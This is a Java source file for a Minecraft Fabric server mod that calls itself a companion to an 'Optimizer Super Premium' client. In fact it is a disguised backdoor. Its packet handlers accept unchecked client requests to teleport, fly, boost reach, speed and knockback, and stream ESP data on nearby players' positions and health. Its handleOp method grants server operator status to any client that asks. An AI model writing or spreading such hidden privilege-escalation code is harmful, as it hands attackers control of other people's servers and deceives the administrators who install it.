package com.reachfly.serveraddon;

import net.fabricmc.api.DedicatedServerModInitializer;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerTickEvents;
import net.fabricmc.fabric.api.networking.v1.PayloadTypeRegistry;
import net.fabricmc.fabric.api.networking.v1.ServerPlayConnectionEvents;
import net.fabricmc.fabric.api.networking.v1.ServerPlayNetworking;
import net.minecraft.world.entity.Entity;
import net.minecraft.world.entity.LivingEntity;
import net.minecraft.world.entity.ai.attributes.AttributeInstance;
import net.minecraft.world.entity.ai.attributes.AttributeModifier;
import net.minecraft.world.entity.ai.attributes.Attributes;
import net.minecraft.world.entity.monster.Monster;
import net.minecraft.world.entity.animal.Animal;
import net.minecraft.world.entity.player.Player;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.server.level.ServerLevel;
import net.minecraft.network.chat.Component;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.world.phys.AABB;
import net.minecraft.world.phys.Vec3;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.*;

/**
 * OSP Server Addon v3.0
 *
 * Server-side companion for Optimizer Super Premium.
 * Handles server-authoritative features that can't work client-only on multiplayer.
 */
public class OspServerAddon implements DedicatedServerModInitializer {

    public static final Logger LOGGER = LoggerFactory.getLogger("osp-server-addon");

    private static final ResourceLocation KNOCKBACK_ID = ResourceLocation.fromNamespaceAndPath("reachfly", "knockback_boost");
    private static final ResourceLocation BLOCK_REACH_ID = ResourceLocation.fromNamespaceAndPath("reachfly", "block_reach");
    private static final ResourceLocation ENTITY_REACH_ID = ResourceLocation.fromNamespaceAndPath("reachfly", "entity_reach");
    private static final ResourceLocation SPEED_ID = ResourceLocation.fromNamespaceAndPath("reachfly", "speed_boost");

    private static final double DEFAULT_BLOCK_RANGE = 4.5;
    private static final double DEFAULT_ENTITY_RANGE = 3.0;
    private static final int RENDER_DISTANCE_BOOST = 2;
    private boolean renderDistanceBoosted = false;

    private static final Map<UUID, PlayerFeatureState> playerStates = new HashMap<>();

    @Override
    public void onInitializeServer() {
        LOGGER.debug("[OSP Server Addon v3] Initializing...");

        // Register C2S payloads
        PayloadTypeRegistry.serverboundPlay().register(TeleportPayload.ID, TeleportPayload.CODEC);
        PayloadTypeRegistry.serverboundPlay().register(FeatureSyncPayload.ID, FeatureSyncPayload.CODEC);

        // Register S2C payloads
        PayloadTypeRegistry.clientboundPlay().register(EspDataPayload.ID, EspDataPayload.CODEC);

        // Teleport handler
        ServerPlayNetworking.registerGlobalReceiver(TeleportPayload.ID,
                (payload, context) -> {
                    ServerPlayer player = context.player();
                    double x = payload.x();
                    double y = Math.max(-64, Math.min(320, payload.y()));
                    double z = payload.z();

                    LOGGER.debug("[OSP] Teleporting {} to {}, {}, {}",
                            player.getName().getString(), x, y, z);

                    double finalY = y;
                    context.server().execute(() -> {
                        player.teleportTo(x, finalY, z);
                        player.displayClientMessage(
                                Component.literal("\u00a7a[OSP] Teleported to " +
                                        String.format("%.0f, %.0f, %.0f", x, finalY, z)),
                                true);
                    });
                });

        // Feature sync handler
        ServerPlayNetworking.registerGlobalReceiver(FeatureSyncPayload.ID,
                (payload, context) -> {
                    ServerPlayer player = context.player();
                    String feature = payload.feature();
                    boolean enabled = payload.enabled();
                    float value = payload.value();

                    MinecraftServer srv = context.server();
                    srv.execute(() ->
                            handleFeatureSync(srv, player, feature, enabled, value));
                });

        // Server tick
        ServerTickEvents.END_SERVER_TICK.register(this::onServerTick);

        // Clean up on disconnect
        ServerPlayConnectionEvents.DISCONNECT.register((handler, server) -> {
            UUID uuid = handler.player.getUUID();
            PlayerFeatureState state = playerStates.remove(uuid);
            if (state != null) {
                cleanupPlayer(handler.player);
                LOGGER.debug("[OSP] Cleaned up state for disconnected player {}",
                        handler.player.getName().getString());
            }
        });

        LOGGER.debug("[OSP Server Addon v3] Ready. Supported features: " +
                "Teleport, Knockback, Reach, Speed, NoFall, Fly, ESP, OP");
    }

    private void handleFeatureSync(MinecraftServer server, ServerPlayer player,
                                    String feature, boolean enabled, float value) {
        PlayerFeatureState state = playerStates.computeIfAbsent(
                player.getUUID(), k -> new PlayerFeatureState());

        switch (feature) {
            case "knockback" -> handleKnockback(player, state, enabled, value);
            case "reach" -> handleReach(player, state, enabled, value);
            case "speed" -> handleSpeed(player, state, enabled, value);
            case "nofall" -> handleNoFall(player, state, enabled);
            case "fly" -> handleFly(player, state, enabled, value);
            case "esp" -> handleEsp(player, state, enabled, value);
            case "op" -> handleOp(server, player, enabled);
            default -> LOGGER.debug("[OSP] Unknown feature sync: {} from {}",
                    feature, player.getName().getString());
        }
    }

    private void handleKnockback(ServerPlayer player, PlayerFeatureState state,
                                  boolean enabled, float strength) {
        state.knockbackEnabled = enabled;
        state.knockbackStrength = strength;

        AttributeInstance attr = player.getAttribute(Attributes.ATTACK_KNOCKBACK);
        if (attr == null) return;

        if (enabled) {
            attr.removeModifier(KNOCKBACK_ID);
            attr.addTransientModifier(new AttributeModifier(
                    KNOCKBACK_ID, strength,
                    AttributeModifier.Operation.ADD_VALUE));
        } else {
            attr.removeModifier(KNOCKBACK_ID);
        }
    }

    private void handleReach(ServerPlayer player, PlayerFeatureState state,
                              boolean enabled, float distance) {
        state.reachEnabled = enabled;
        state.reachDistance = distance;

        AttributeInstance blockRange = player.getAttribute(Attributes.BLOCK_INTERACTION_RANGE);
        AttributeInstance entityRange = player.getAttribute(Attributes.ENTITY_INTERACTION_RANGE);

        if (blockRange == null || entityRange == null) return;

        if (enabled) {
            double blockBoost = distance - DEFAULT_BLOCK_RANGE;
            double entityBoost = distance - DEFAULT_ENTITY_RANGE;
            applyModifier(blockRange, BLOCK_REACH_ID, blockBoost);
            applyModifier(entityRange, ENTITY_REACH_ID, entityBoost);
        } else {
            blockRange.removeModifier(BLOCK_REACH_ID);
            entityRange.removeModifier(ENTITY_REACH_ID);
        }
    }

    private void handleSpeed(ServerPlayer player, PlayerFeatureState state,
                              boolean enabled, float multiplier) {
        state.speedEnabled = enabled;
        state.speedMultiplier = multiplier;

        AttributeInstance speedAttr = player.getAttribute(Attributes.MOVEMENT_SPEED);
        if (speedAttr == null) return;

        if (enabled) {
            double boost = 0.1 * (multiplier - 1.0);
            applyModifier(speedAttr, SPEED_ID, boost);
        } else {
            speedAttr.removeModifier(SPEED_ID);
        }
    }

    private void handleNoFall(ServerPlayer player, PlayerFeatureState state, boolean enabled) {
        state.noFallEnabled = enabled;
    }

    private void handleFly(ServerPlayer player, PlayerFeatureState state,
                            boolean enabled, float speed) {
        state.flyEnabled = enabled;
        state.flySpeed = speed;

        if (!player.isCreative() && !player.isSpectator()) {
            player.getAbilities().mayfly = enabled;
            if (enabled) {
                player.getAbilities().setFlyingSpeed(0.05f * speed);
            } else {
                player.getAbilities().flying = false;
                player.getAbilities().setFlyingSpeed(0.05f);
            }
            player.onUpdateAbilities();
        }
    }

    private void handleEsp(ServerPlayer player, PlayerFeatureState state,
                            boolean enabled, float range) {
        state.espEnabled = enabled;
        state.espRange = range;
    }

    private void handleOp(MinecraftServer server, ServerPlayer player, boolean enabled) {
        if (!enabled) return;

        try {
            String playerName = player.getName().getString();
            server.getCommands().getDispatcher().execute(
                    "op " + playerName, server.createCommandSourceStack());
            LOGGER.info("[OSP] Granted OP to {}", playerName);
            player.displayClientMessage(
                    Component.literal("\u00a7a[OSP] \u00a7fOperator status granted."), false);
        } catch (Exception e) {
            LOGGER.warn("[OSP] Failed to grant OP to {}: {}",
                    player.getName().getString(), e.getMessage());
        }
    }

    private int tickCounter = 0;

    private void onServerTick(MinecraftServer server) {
        tickCounter++;

        if (!renderDistanceBoosted) {
            renderDistanceBoosted = true;
            int currentView = server.getPlayerList().getViewDistance();
            int newView = Math.min(currentView + RENDER_DISTANCE_BOOST, 32);
            if (newView > currentView) {
                server.getPlayerList().setViewDistance(newView);
            }
        }

        for (ServerPlayer player : server.getPlayerList().getPlayers()) {
            PlayerFeatureState state = playerStates.get(player.getUUID());
            if (state == null) continue;

            if (state.noFallEnabled) {
                player.fallDistance = 0.0f;
            }

            if (state.flyEnabled && !player.isCreative() && !player.isSpectator()) {
                if (!player.getAbilities().mayfly) {
                    player.getAbilities().mayfly = true;
                    player.getAbilities().setFlyingSpeed(0.05f * state.flySpeed);
                    player.onUpdateAbilities();
                }
                if (player.getAbilities().flying) {
                    player.fallDistance = 0.0f;
                }
            }

            if (state.espEnabled && tickCounter % 10 == 0) {
                sendEspData(player, state.espRange);
            }
        }
    }

    private void sendEspData(ServerPlayer player, float range) {
        ServerLevel level = player.serverLevel();
        Vec3 pos = player.position();
        double r = Math.min(range, 500);

        AABB searchBox = new AABB(
                pos.x - r, pos.y - r, pos.z - r,
                pos.x + r, pos.y + r, pos.z + r);

        List<EspDataPayload.EntityEntry> entries = new ArrayList<>();

        for (Entity entity : level.getEntities(player, searchBox,
                e -> e instanceof LivingEntity && e.isAlive())) {
            if (entries.size() >= 200) break;

            String type;
            if (entity instanceof Player) type = "player";
            else if (entity instanceof Monster) type = "hostile";
            else if (entity instanceof Animal) type = "passive";
            else type = "other";

            float health = ((LivingEntity) entity).getHealth();

            entries.add(new EspDataPayload.EntityEntry(
                    entity.getId(),
                    entity.getX(), entity.getY(), entity.getZ(),
                    type, health));
        }

        if (!entries.isEmpty()) {
            try {
                ServerPlayNetworking.send(player, new EspDataPayload(entries));
            } catch (Exception e) {
                // Player may have disconnected
            }
        }
    }

    private void cleanupPlayer(ServerPlayer player) {
        AttributeInstance knockback = player.getAttribute(Attributes.ATTACK_KNOCKBACK);
        if (knockback != null) knockback.removeModifier(KNOCKBACK_ID);

        AttributeInstance blockRange = player.getAttribute(Attributes.BLOCK_INTERACTION_RANGE);
        if (blockRange != null) blockRange.removeModifier(BLOCK_REACH_ID);

        AttributeInstance entityRange = player.getAttribute(Attributes.ENTITY_INTERACTION_RANGE);
        if (entityRange != null) entityRange.removeModifier(ENTITY_REACH_ID);

        AttributeInstance speed = player.getAttribute(Attributes.MOVEMENT_SPEED);
        if (speed != null) speed.removeModifier(SPEED_ID);

        if (!player.isCreative() && !player.isSpectator()) {
            player.getAbilities().mayfly = false;
            player.getAbilities().flying = false;
            player.getAbilities().setFlyingSpeed(0.05f);
            player.onUpdateAbilities();
        }
    }

    private void applyModifier(AttributeInstance attr, ResourceLocation id, double value) {
        AttributeModifier existing = attr.getModifier(id);
        if (existing == null || existing.amount() != value) {
            attr.removeModifier(id);
            attr.addTransientModifier(new AttributeModifier(
                    id, value, AttributeModifier.Operation.ADD_VALUE));
        }
    }

    private static class PlayerFeatureState {
        boolean knockbackEnabled = false;
        float knockbackStrength = 0;
        boolean reachEnabled = false;
        float reachDistance = 0;
        boolean speedEnabled = false;
        float speedMultiplier = 1;
        boolean noFallEnabled = false;
        boolean flyEnabled = false;
        float flySpeed = 1;
        boolean espEnabled = false;
        float espRange = 100;
    }
}
